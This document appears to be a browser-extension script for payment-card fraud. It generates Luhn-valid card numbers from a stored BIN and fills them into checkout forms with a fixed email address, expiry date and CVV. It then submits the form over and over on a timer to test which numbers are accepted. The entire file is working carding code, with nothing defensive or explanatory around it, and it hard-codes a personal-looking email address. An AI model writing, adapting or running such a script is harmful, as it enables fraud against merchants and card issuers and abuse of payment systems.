chrome.storage.local.get(["bin", "retryCount", "successKeyword"], async ({ bin, retryCount, successKeyword }) => {
  const email = "songindian16@gmail.com";
  const cardholderName = "@PhiloWise";
  const expiryMonth = "05";
  const expiryYear = "2029";
  const cvv = "000";

  function generateCardNumber(bin) {
    let cardNumber = bin;
    while (cardNumber.length < 15) {
      cardNumber += Math.floor(Math.random() * 10);
    }
    const digits = cardNumber.split("").map(Number);
    let sum = 0;
    let isDouble = false;
    for (let i = digits.length - 1; i >= 0; i--) {
      let digit = digits[i];
      if (isDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      isDouble = !isDouble;
    }
    return cardNumber + ((10 - (sum % 10)) % 10);
  }

  async function autofill() {
    let attempts = 0;
    while (attempts < retryCount) {
      const cardNumber = generateCardNumber(bin);
      document.querySelector("input[type='email']").value = email;
      document.querySelector("input[name='cardnumber']").value = cardNumber;
      document.querySelector("input[name='exp-date']").value = `${expiryMonth}/${expiryYear.slice(2)}`;
      document.querySelector("input[name='cvc']").value = cvv;
      document.querySelector("input[name='cardholder-name']").value = cardholderName;

      const form = document.querySelector("form");
      if (form) form.submit();

      console.log(`Attempt ${attempts + 1}: Submitted with card ${cardNumber}`);
      attempts++;
      await new Promise((resolve) => setTimeout(resolve, 2000));
    }
  }

  autofill();
});
